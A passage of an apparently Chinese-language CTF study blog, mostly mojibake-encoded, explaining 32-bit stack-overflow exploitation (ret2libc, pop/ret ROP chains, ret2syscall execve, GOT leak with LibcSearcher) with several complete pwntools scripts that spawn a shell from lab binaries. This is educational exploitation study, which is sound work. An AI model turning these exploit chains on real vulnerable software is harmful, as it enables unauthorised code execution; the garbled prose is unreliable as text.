å…¥get()çš„å‚æ•°ï¼Œbä½œä¸ºgetå‡½æ•°åº•è‰²å‚æ•°ï¼Œå³å…¶ä»ç»ˆç«¯è¯»å–çš„æ•°æ®è¦å­˜å…¥çš„åœ°æ–¹ ï¼ˆ) ï¼ˆ2ï¼‰getå‡½æ•°è¢«è°ƒç”¨åä¼šä¸ºè‡ªå·±å¼€è¾Ÿç©ºé—´ï¼Œæ‰§è¡Œæ—¶å†æ¬¡é€šè¿‡æ ˆæº¢å‡ºå¡«å…¥systemå‡½æ•°çš„åœ°å€å’Œå‚æ•°ï¼Œæœ€åè°ƒç”¨systemæ‰§è¡Œæ„é€ å¥½çš„åé—¨å‡½æ•° åˆ†æä¹‹åå¾—åˆ°åº”è¯¥æ„é€ å¦‚ä¸‹å½¢å¼çš„payload å…¶ä¸­get()å‡½æ•°å’Œsyså‡½æ•°çš„å‚æ•°éƒ½æ˜¯bssæ®µï¼Œget()ç”¨æ¥æŠŠbin&#x2F;shå†™å…¥bssæ®µï¼Œsyså’Œå®ƒæ„æˆåé—¨å‡½æ•° getå†™å…¥bssæ®µçš„å†…å®¹éœ€è¦ä»ç»ˆç«¯è¯»å–ï¼Œæ‰€ä»¥ä¹‹åè¿˜è¦ä¸ºå…¶å‘é€ä¸€ä¸ªâ€œbin&#x2F;shâ€ Payloadçš„å½¢å¼æ˜¯p32ï¼ˆgets_addrï¼‰+p32ï¼ˆsystem_addrï¼‰+p32ï¼ˆgets_p1ï¼‰+p32ï¼ˆsystem_p1ï¼‰ã€‚ å¼€å¯äº†NXä¿æŠ¤ï¼Œå†™å’Œè¿è¡Œä¸èƒ½åŒæ—¶å®ç°ï¼Œæ‰€ä»¥æ”¹å˜è¯¥å‡½æ•°çš„å‚æ•°ä½ç½®ï¼Œæ‰€ä»¥æŠŠ /bin/shï¼‰å†™å…¥ä¸€ä¸ªå¯å†™çš„å†…å­˜åŒºåŸŸã€‚.bss æ®µæ˜¯ä¸€ä¸ªéå¸¸ç†æƒ³çš„é€‰æ‹©ï¼Œå› ä¸ºå®ƒï¼š å¯å†™ é€šå¸¸ä½äºå›ºå®šçš„åœ°å€ï¼ˆç‰¹åˆ«æ˜¯åœ¨ æ²¡æœ‰å¼€å¯ ASLR çš„æƒ…å†µä¸‹ï¼‰ï¼› åœ¨ç¨‹åºè¿è¡ŒæœŸé—´æœªåˆå§‹åŒ–çš„æ•°æ®éƒ½å­˜å‚¨åœ¨è¿™é‡Œã€‚ æ‰¾bssåœ°å€ 1.readelf readelf -S ret2libc2 2.gdbè°ƒè¯• gdb ./ret2libc2 info files æ˜¾ç¤ºäº†bssæ®µçš„å§‹æœ«ä½ç½® 3.è„šæœ¬ä¸­ç›´æ¥å¾—åˆ° elf.bss() è„šæœ¬12345678910111213from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() gdbè°ƒè¯•æ£€æŸ¥æ˜¯å¦æˆåŠŸå†™å…¥ cä¸€ä¸‹è¿è¡Œåˆ°ä¸‹æ–­ç‚¹ä½ç½® è¿™ä¸ªæ—¶å€™ç¬¬ä¸€ä¸ªgetå·²ç»å®ç°ï¼Œpayloadå·²ç»ä¼ å…¥äº† ä¸‹ä¸€æ­¥ä¼šè¿›å…¥æˆ‘ä»¬ä¼ è¿›å»çš„getä¸­ get å’Œsystemå‡½æ•°éƒ½æ‰§è¡Œç»“æŸå x/s 0x0804a040å‘ç°bsså†…å­˜å…¥äº†bin&#x2F;sh ret2libc2(å¤šä¸ªå‡½æ•°çš„ropé“¾)å‡è®¾ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶é‡Œä»…æœ‰readå‡½æ•°ï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆfdï¼Œaddrå’Œlengthï¼‰ è¿™æ˜¯æŒ‰ç…§ä¸¤ä¸ªropé“¾å†™å‡ºçš„payloadå¡«è¡¥å½¢å¼ å‡½æ•°readå› ä¸ºæ‹¥æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç›¸åº”åœ°åœ¨æ ˆä¸Šéœ€è¦æœ‰ä¸‰ä¸ªå—çš„ç©ºé—´ã€‚è¿™æ—¶ï¼Œsystemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®å°±ä¼šå’Œreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®å†²çªï¼Œå¯¼è‡´æ— æ³•å°†systemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾ç½®åœ¨æ ˆä¸Šã€‚ä¸æ–¹ä¾¿ç›´æ¥è¦†ç›–ï¼Œå› ä¸ºreadçš„å‚æ•°é™åˆ¶æ¯”è¾ƒå¤š æ‰€ä»¥è¿™ç§æƒ…å†µå°±å¯ä»¥ç”¨pop&#x2F;retè¿›è¡Œ æ³¨æ„é€‰å–çš„åŸºæœ¬åŸåˆ™ï¼šæœ‰å‡ ä¸ªå‚æ•°å°±ç”¨å‡ ä¸ªpopæŒ‡ä»¤ï¼Œæ¯”å¦‚è°ƒç”¨å®Œgetså‡½æ•°ä¹‹åï¼Œå› ä¸ºgetså‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€æœ‰å¯ä»¥å°†getså‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸º0x0804862Fï¼Œå³åªæ‰§è¡Œä¸€ä¸ªpopæŒ‡ä»¤å¼¹å‡ºå‚æ•°ä¹‹åå°±æ˜¯retæŒ‡ä»¤ï¼›æ¯”å¦‚readå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå°±æ‰¾0x0804862Dè¿™ä¸ªä½ç½®ï¼Œå› ä¸ºè¿™ä¸ªä½ç½®çš„æŒ‡ä»¤æ˜¯3ä¸ªpopæŒ‡ä»¤åŠ ä¸Šä¸€ä¸ªretæŒ‡ä»¤ å¦‚ä½•å¯»æ‰¾è‹¥å¹²ä¸ªpopæŒ‡ä»¤è·Ÿç€retæŒ‡ä»¤ ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot; (ROPgadgetç”¨äºæŸ¥æ‰¾ç”¨æ¥æ”»å‡»çš„å¯æ‰§è¡Œä»£ç ç‰‡æ®µï¼Œè€Œreadlfæ˜¯ç¨‹åºçš„æ•´ä½“ç»“æ„å’Œå†…å­˜å¸ƒå±€) è„šæœ¬12345678910111213141516from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() payload += p32(get) + p32(pop1_ret) + p32(bss): ç›˜å­æ¯”å–» å‡†å¤‡ ROP é“¾ï¼ˆå †å ç›˜å­ï¼‰ï¼š ä½ åœ¨å†…å­˜çš„æ ˆä¸Šï¼Œä»ä¸‹å¾€ä¸Šï¼ˆä¹Ÿå°±æ˜¯ä»ä½åœ°å€å¾€é«˜åœ°å€ï¼Œå› ä¸ºæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼‰ï¼Œåƒå †å ç›˜å­ä¸€æ ·æ”¾äº†ä¸€ç³»åˆ—åœ°å€ã€‚ å‡è®¾ä½ çš„ ROP é“¾ç‰‡æ®µæ˜¯ï¼šA (getåœ°å€), B (pop ebp; retåœ°å€), C (bssåœ°å€)ã€‚ æ ˆä¸Šçš„ç›˜å­ï¼š 1234... (å…¶ä»–æ•°æ®)[ C ç›˜å­ (bssåœ°å€) ] &lt;-- ä½äºæ ˆä¸Šè¾ƒé«˜ä½ç½®[ B ç›˜å­ (pop ebp; retåœ°å€) ][ A ç›˜å­ (getåœ°å€) ] &lt;-- ä½äºæ ˆä¸Šè¾ƒä½ä½ç½®ï¼Œæœ€å…ˆè¢«ç¨‹åºâ€œçœ‹åˆ°â€ å½“ç¨‹åºè¿”å›æ—¶ï¼Œä¼šå…ˆâ€œæ‹¿èµ·â€æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆAï¼‰ã€‚ æ‰§è¡Œ get å‡½æ•°ï¼ˆä½¿ç”¨ A ç›˜å­ï¼‰ï¼š ç¨‹åºå› ä¸ºæ ˆæº¢å‡ºè¢«åŠ«æŒï¼Œå®ƒä¼šè·³åˆ° get å‡½æ•°çš„åœ°å€ï¼ˆA ç›˜ï¼‰ã€‚ get å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚å®ƒéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€æ¥å­˜æ”¾å®ƒè¯»å–çš„æ•°æ®ã€‚ get å‡½æ•°ä¼šå»â€œçœ‹â€å®ƒè‡ªå·±è¿”å›åœ°å€ä¸Šæ–¹çš„â€œç›˜å­â€ï¼Œä¹Ÿå°±æ˜¯ C ç›˜å­ (bssåœ°å€)ã€‚ æ‰€ä»¥ï¼ŒC ç›˜å­ (bssåœ°å€) è¢« get å‡½æ•°å½“ä½œäº†å®ƒçš„å‚æ•°ï¼Œget ä¼šå°†ä½ é€šè¿‡ p.sendline(&quot;/bin/sh&quot;) å‘é€çš„æ•°æ®å†™å…¥åˆ° C ç›˜å­ æ‰€æŒ‡ç¤ºçš„å†…å­˜åŒºåŸŸï¼ˆå³ bss æ®µï¼‰ã€‚ get å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå®ƒéœ€è¦â€œè¿”å›â€ã€‚å®ƒä¼šä»æ ˆä¸Šå–å›å®ƒçš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯ç´§é‚»å…¶ä¸‹çš„ B ç›˜å­ (pop ebp; retåœ°å€)ã€‚ æ‰§è¡Œ pop ebp; ret gadgetï¼ˆä½¿ç”¨ B ç›˜å­ï¼‰ï¼š ç¨‹åºè·³è½¬åˆ° B ç›˜å­ (pop ebp; retåœ°å€)ã€‚ ç°åœ¨ï¼ŒB ç›˜å­ å†…éƒ¨çš„æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼š pop ebpï¼š è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆé¡¶çš„é‚£ä¸ªç›˜å­ã€‚æ­¤æ—¶æ ˆé¡¶å°±æ˜¯ C ç›˜å­ (bssåœ°å€)ã€‚æ‰€ä»¥ï¼ŒC ç›˜å­ (bssåœ°å€) ä¼šè¢«å¼¹å‡ºå¹¶æ”¾å…¥ ebp å¯„å­˜å™¨ã€‚è¿™ä¸ªæ“ä½œç›¸å½“äºæŠŠ C ç›˜å­ ä»æ ˆä¸­æ‹¿èµ°äº†ã€‚ retï¼š è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆä¸­ç°åœ¨æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆä¹Ÿå°±æ˜¯ C ç›˜å­ è¢«æ‹¿èµ°åæš´éœ²å‡ºçš„ä¸‹ä¸€ä¸ªç›˜å­ï¼‰ï¼Œå¹¶è·³è½¬åˆ°é‚£ä¸ªç›˜å­ä¸Šçš„åœ°å€ã€‚è¿™ä¸ªç›˜å­å°±æ˜¯ä½  ROP é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ï¼ˆä¾‹å¦‚ sys å‡½æ•°çš„åœ°å€ï¼‰ã€‚ ret2syscall(åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€) å¼€å¯äº†NXä¿æŠ¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ ROPé“¾å®ç°è·³è½¬ï¼Œè€Œä¸æ”¹å˜æ•°æ®æ®µçš„æ•°å€¼ é™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä¸Šé¢æœ‰æ•ˆçš„ä¸œè¥¿äº†,æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­éƒ½æ²¡æœ‰systemå‡½æ•° æ‰€ä»¥è‡ªå·±ä¸ºå¯„å­˜å™¨èµ‹å€¼ä»¥æ„é€ åé—¨å‡½æ•°ã€‚ä¸”è°ƒç”¨çš„int 0x80è¦æ”¾åœ¨æœ€ä¸Šé¢ï¼Œè°ƒç”¨æ—¶ï¼Œä»ä¸‹å¾€ä¸Šå¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œåˆ°è°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œè¯¥å‡½æ•°çš„å‚æ•°å¿…é¡»å‡†å¤‡å¥½ã€ æ ¹æ®å‘½ä»¤æ‰¾åˆ°&#x2F;bin&#x2F;shå­—ç¬¦æ®µ å’Œint 0x80çš„è°ƒç”¨å‘½ä»¤ä»¥åŠéœ€è¦çš„pop|retå‘½ä»¤ è„šæœ¬12345678910111213141516171819from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive() ç¼–è¯‘çŸ¥è¯†ï¼ˆ1ï¼‰é™æ€ç¼–è¯‘ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæå–å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦è°ƒç”¨çš„å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆ.soï¼‰ä¸­çš„éƒ¨åˆ†ï¼Œå¹¶é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ å»ï¼Œä½¿å¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œçš„æ—¶å€™ä¸ä¾èµ–äºåŠ¨æ€é“¾æ¥åº“ã€‚ ï¼ˆ2ï¼‰åŠ¨æ€ç¼–è¯‘ã€‚åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦é™„å¸¦ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨æ‰§è¡Œæ—¶ï¼Œéœ€è¦è°ƒç”¨å…¶å¯¹åº”åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‘½ä»¤ã€‚æ‰€ä»¥ï¼Œå…¶ä¼˜ç‚¹ä¸€æ–¹é¢æ˜¯ ç¼©å°äº†å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œä¼˜ç‚¹åŠ å¿«äº†ç¼–è¯‘é€Ÿåº¦ï¼ŒèŠ‚çœäº†ç³»ç»Ÿèµ„æºã€‚ç¼ºç‚¹ä¸€æ–¹é¢æ˜¯å“ªæ€•å¾ˆç®€å•çš„ç¨‹åºï¼Œåªè¦ç”¨åˆ°äº†é“¾æ¥åº“ä¸­çš„ä¸€ä¸¤æ¡å‘½ä»¤ï¼Œä¹Ÿè¦é™„å¸¦ä¸€ä¸ªåºå¤§çš„é“¾æ¥åº“ï¼›å¦ä¸€æ–¹é¢æ˜¯å¦‚æœå…¶ä»–è®¡ç®—æœºä¸Šæ²¡æœ‰å®‰è£…å¯¹åº”çš„è¿è¡Œåº“ï¼Œåˆ™ç»è¿‡åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶å°±ä¸èƒ½è¿è¡Œã€‚ é™æ€ç¼–è¯‘çš„ä¼˜ç¼ºç‚¹ä¸åŠ¨æ€ç¼–è¯‘æ­£å¥½ç›¸åã€‚ é™æ€ç¼–è¯‘å¯ä»¥ç®€å•ç†è§£ä¸ºå°†åŠ¨æ€é“¾æ¥åº“ä¸­çš„ä»£ç æ‹·è´å‡ºæ¥æ”¾å…¥å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶é‡Œã€‚ å¯„å­˜å™¨ åœ¨32ä½ç³»ç»Ÿä¸­ï¼Œé€šè¿‡int 0x80æŒ‡ä»¤è§¦å‘ç³»ç»Ÿè°ƒç”¨ã€‚å…¶ä¸­ï¼ŒEAXå¯„å­˜å™¨ç”¨äºä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼Œå‚æ•°æŒ‰é¡ºåºèµ‹å€¼ç»™EBXã€ECXã€EDXã€ESIã€ EDIã€EBPè¿™6ä¸ªå¯„å­˜å™¨ã€‚ åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨syscallæŒ‡ä»¤æ¥è§¦å‘ç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ ·ä½¿ç”¨EAXï¼ˆRAXï¼‰å¯„å­˜å™¨ä¼ é€’ç³»ç»Ÿè°ƒç”¨å·ï¼ŒRDIã€RSIã€RDXã€RCXã€R8ã€R9 è¿™6ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ é€’å‚æ•°ã€‚ eg:readï¼ˆ0,buf,0x100ï¼‰ 32ä½æ—¶ï¼Œeax&#x3D;3ï¼ˆ#define__NR_read 3ï¼‰;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚å®é™…ä¸Šï¼Œæœ€åè¿˜ä¼šè¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚ 64ä½æ—¶ï¼Œrax&#x3D;0ï¼ˆ#define__NR_read 0ï¼‰;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡ŒsyscallæŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„readï¼ˆ0,buf,0x100ï¼‰ã€‚ ä¹Ÿæ˜¯è¿›å…¥å†…æ ¸æ€æ‰§è¡Œã€‚ å¦‚æœæƒ³è¦å®ŒæˆGet shell 32ä½æ—¶ï¼Œï¼šeax&#x3D;11ï¼ˆ#define__NR_execve 11ï¼‰;ebx&#x3D;â€&#x2F;bin&#x2F;shâ€;ecx&#x3D;0;edx&#x3D;0;ï¼ˆNULLå®é™…ä¸Šå°±æ˜¯0ï¼‰ï¼Œè®¾ç½®å®Œæ¯ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹åï¼Œå†æ‰§è¡Œint 0x80æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œå¯¹åº”çš„execveï¼ˆâ€&#x2F;bin&#x2F;shâ€,NULL,NULLï¼‰ã€‚ 64ä½æ—¶ï¼Œrax&#x3D;59ï¼ˆ#define__NR_execve 59ï¼‰;rdi&#x3D;â€&#x2F;bin&#x2F;shâ€;rsi&#x3D;0;rdx&#x3D;0; åœ¨idaä¸­çº¢è‰²ä¸ºå¤–éƒ¨å‡½æ•°ï¼Œç™½è‰²ä¸ºå†…éƒ¨å‡½æ•° é™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶å…¨ä¸ºå†…éƒ¨å‡½æ•° ret2libc3è„šæœ¬123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# æ³„éœ² gets åœ°å€p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# è·å–æ³„éœ²åœ°å€leak_addr = u32(p.recv(4))# ç”¨ LibcSearcher æŸ¥libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher ä¼šæ ¹æ®ä½ æä¾›çš„å‡½æ•°åå’Œåœ°å€ï¼Œå»åŒ¹é…å·²çŸ¥çš„ libc æ•°æ®åº“libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)æ˜¯gets å‡½æ•°åœ¨ libc ä¸­çš„åç§»ï¼ˆç›¸å¯¹äº libc åŸºåœ°å€ï¼‰system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#è¾“å‡ºè¿™ä¸ªè®¡ç®—å‡ºçš„åœ°å€ï¼Œä¾¿äºæ£€æŸ¥# ç¬¬äºŒæ¬¡æ”»å‡»p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got) è°ƒç”¨putå‡½æ•°æ³„éœ²getså‡½æ•°çš„å®é™…åœ°å€ï¼Œå¹¶ä¸”è¿”å›mainå‡½æ•°ï¼Œå†æ¬¡åˆ©ç”¨gotæ¼æ´ å®ƒå†…éƒ¨ä½¿ç”¨çš„æ˜¯ é¢„å®šä¹‰ç¬¦å·å ï¼Œæ¯”å¦‚ï¼š &quot;system&quot; &quot;gets&quot; &quot;printf&quot; &quot;str_bin_sh&quot; ï¼ˆå°±æ˜¯ä½ è¦æ‰¾çš„ /bin/shï¼‰ è¿™äº›åå­—ä¸æ˜¯éšä¾¿å†™çš„ï¼Œæ˜¯é¢„å…ˆåœ¨ libc æ•°æ®åº“ä¸­å®šä¹‰å¥½çš„ç¬¦å·åç§°ã€‚ è„šæœ¬æ‰§è¡Œåä¼šæ˜¾ç¤º è¿™æ˜¯å› ä¸ºç”¨libc &#x3D; LibcSearcher(â€œgetsâ€, leak_addr)è¿›è¡Œé€‰æ‹©é€‚åˆçš„libcåº“ï¼Œä½†ä¸åŒç‰ˆæœ¬çš„libc.soæ–‡ä»¶çš„å˜åŒ–ä¸å¤§ï¼Œä¸€ä¸ªå‡½æ•°çš„åœ°å€çº¦æŸä¸å¤Ÿä¸¥æ ¼ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤ºå¤šä¸ªlibcç‰ˆæœ¬ä¾›é€‰æ‹© è§£å†³å¤šä¸ªlibc.soç‰ˆæœ¬ä¾›é€‰æ‹©1.å¤šä¸ªçº¦æŸæ¡ä»¶ å“ªäº›ç¬¦å·æœ€ç¨³å¦¥ è¿™æ˜¯ä¸ªå¾ˆé‡è¦çš„é—®é¢˜ï¼š ä¸ºä»€ä¹ˆæ³„éœ² gets &#x2F; puts &#x2F; printfï¼Œä¸æ³„éœ² malloc &#x2F; exit &#x2F; system å‘¢ï¼Ÿ ç†ç”±ï¼š ç¬¦å· ç¨³å¦¥ç¨‹åº¦ åŸå›  puts ğŸ‘ å‡ ä¹æ¯ä¸ª libc é‡Œéƒ½æœ‰ï¼Œåç§»ç‹¬ç‰¹ printf ğŸ‘ å¸¸è§ï¼Œåç§»ç‹¬ç‰¹ gets ğŸ‘ï¼ˆä½†æ˜¯ glibc2.28+ è¢«åºŸå¼ƒäº†ï¼‰ read ğŸ‘ æ ¸å¿ƒ IOï¼Œå­˜åœ¨ä¸”ç¨³å®š write ğŸ‘ å’Œ read å¯¹åº” system ğŸ‘ å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯æœ‰çš„ libc æŠŠå®ƒé™æ€é“¾æ¥äº†æˆ–è€…ä½ç½®å¾ˆå¸¸è§ exit ğŸ‘ åç§»è¾ƒå°ä¸”å¸¸è§ï¼Œä¸å»ºè®®ç”¨ __libc_start_main ğŸ‘ éå¸¸ç¨³å¦¥ï¼Œé€šå¸¸ä¸ä¼šå†²çª å› æ­¤å»ºè®®ä½ æ³„éœ²çš„ä¼˜å…ˆçº§æ˜¯ï¼š 1puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets ç†æƒ³çŠ¶æ€ä¸‹ï¼Œä½ ä¸€æ¬¡æ€§æ³„éœ²ä¸‰ä¸ªç¬¦å·ï¼Œæ¯”å¦‚ï¼š 123puts(gets@got);puts(puts@got);puts(printf@got); ç„¶åç”¨ä¸‰ä¸ªç¬¦å·å»æŸ¥åº“ï¼Œå‡ ä¹100%å”¯ä¸€ ä½†æ˜¯ å½“ç¨‹åºç¼–è¯‘æ—¶ï¼Œåªæœ‰çœŸæ­£è¢«è°ƒç”¨çš„å¤–éƒ¨åº“å‡½æ•°æ‰ä¼šè¢«é“¾æ¥ï¼Œå¹¶ä¸”å®ƒä»¬æ‰ä¼šåœ¨ GOT è¡¨é‡Œæœ‰æ¡ç›®ã€‚ è€Œä½ çš„ç›®æ ‡ç¨‹åº ./ret2libc3 é‡Œï¼š 12bashå¤åˆ¶ç¼–è¾‘gets, puts æœ‰ç”¨åˆ°printf æ²¡ç”¨åˆ° æ‰€ä»¥ï¼šåªèƒ½æœ‰ä¸¤ä¸ªçº¦æŸæ¡ä»¶ 123csså¤åˆ¶ç¼–è¾‘elf.got[&quot;gets&quot;] âœ… å­˜åœ¨elf.got[&quot;puts&quot;] âœ… å­˜åœ¨elf.got[&quot;printf&quot;] âŒ æŠ¥é”™ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#putsçš„gotè¡¨main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#è¾“å‡ºputsçš„å®é™…ä½ç½®p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#æ¥æ”¶å…¶ä½ç½®libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#å¢åŠ putsçš„ä½ç½®ä½œä¸ºçº¦æŸæ¡ä»¶libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() ä½†æ˜¯è¿™ä¸ªæˆ‘å°è¯•è¿‡å¯¹è¿™ä¸ªé¢˜ç›®æ¥è¯´è¿˜æ˜¯çº¦æŸæ¡ä»¶å¤ªå°‘ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªé¢˜ç›®è°ƒç”¨å‡½æ•°æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºçº¦æŸçš„å‡½æ•°ä¹Ÿæ¯”è¾ƒå°‘ 1ï¼‰GOTã€‚GOTæ˜¯å…¨å±€åç§»é‡è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µï¼ˆData Segmentï¼‰å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚ 2ï¼‰PLTæ˜¯ç¨‹åºé“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ï¼Œç¨‹åºä¼šåˆ°PLTä¸­å¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µï¼ˆCode Segmentï¼‰å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ã€‚ 